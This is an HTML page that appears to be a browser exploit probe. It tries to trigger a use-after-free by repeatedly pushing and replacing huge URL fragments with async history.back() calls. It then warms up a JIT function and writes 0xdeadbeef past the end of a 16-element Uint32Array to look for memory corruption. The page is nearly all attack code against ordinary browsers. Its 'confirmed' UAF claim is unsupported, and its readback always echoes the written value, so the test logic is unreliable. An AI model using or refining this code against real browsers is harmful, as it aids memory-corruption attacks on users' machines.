<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF → JIT Intersection Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { padding:10px; font-size:16px; margin:5px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>
<body>

<h2>UAF → TypedArray → JIT Intersection Test</h2>
<button onclick="runTest()">RUN TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";
const sleep = ms => new Promise(r=>setTimeout(r,ms));

/* ===============================
   PHASE 1 — CONFIRMED UAF TRIGGER
   =============================== */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

/* ===============================
   PHASE 2 — BASELINE READ
   =============================== */
function baselineRead(){
    log("\n=== BASELINE READ ===");
    log("URL.length = " + document.URL.length);
    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
}

/* ===============================
   PHASE 3 — CREATE TYPEDARRAY
   INSIDE UAF WINDOW
   =============================== */
function createTypedArray(){
    log("\n=== TYPEDARRAY ALLOCATION ===");
    const buf = new ArrayBuffer(0x40);
    const u32 = new Uint32Array(buf);

    for(let i=0;i<u32.length;i++)
        u32[i] = 0x41414141;

    log("Uint32Array length = " + u32.length);
    return u32;
}

/* ===============================
   PHASE 4 — JIT OOB FUNCTION
   =============================== */
function jitFunc(arr, idx, val){
    return arr[idx] = val;
}

function warmupJIT(arr){
    for(let i=0;i<10000;i++)
        jitFunc(arr, 0, 0x1337);
}

/* ===============================
   PHASE 5 — PROBE
   =============================== */
function probe(arr){
    log("\n=== JIT PROBE ===");
    try{
        const r = jitFunc(arr, 16, 0xdeadbeef);
        log("write/read idx 16 = 0x" + r.toString(16));
    }catch(e){
        log("Exception: " + e);
    }
}

/* ===============================
   MAIN
   =============================== */
async function runTest(){
    logEl.textContent = "";
    await triggerUAF();
    await sleep(120);

    baselineRead();

    const ta = createTypedArray();
    warmupJIT(ta);
    probe(ta);

    log("\n=== POST READ ===");
    log("URL.length = " + document.URL.length);
    log("charCodeAt(64) = " + document.URL.charCodeAt(64));

    log("\n=== TEST END ===");
}
</script>
</body>
</html>
